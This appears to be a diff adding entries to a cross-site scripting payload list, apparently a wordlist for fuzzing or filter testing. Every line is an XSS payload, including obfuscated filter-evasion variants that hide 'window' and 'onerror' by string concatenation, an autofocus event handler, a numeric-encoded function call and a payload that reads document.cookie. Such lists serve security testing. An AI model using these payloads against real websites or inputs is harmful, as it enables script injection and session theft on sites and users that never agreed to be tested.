@@ -1,3 +1,9 @@
+<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
+<input onfocus="alert('xss');" autofocus>
+<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
+<img src="X" onerror=top[8680439..toString(30)](1337)>
+'-alert(document.cookie)-'
+“><img src=x onerror=”a=alert;a(1);”.jpg
 <script>alert(123);</script>
 <ScRipT>alert("XSS");</ScRipT>
 <script>alert(123)</script>
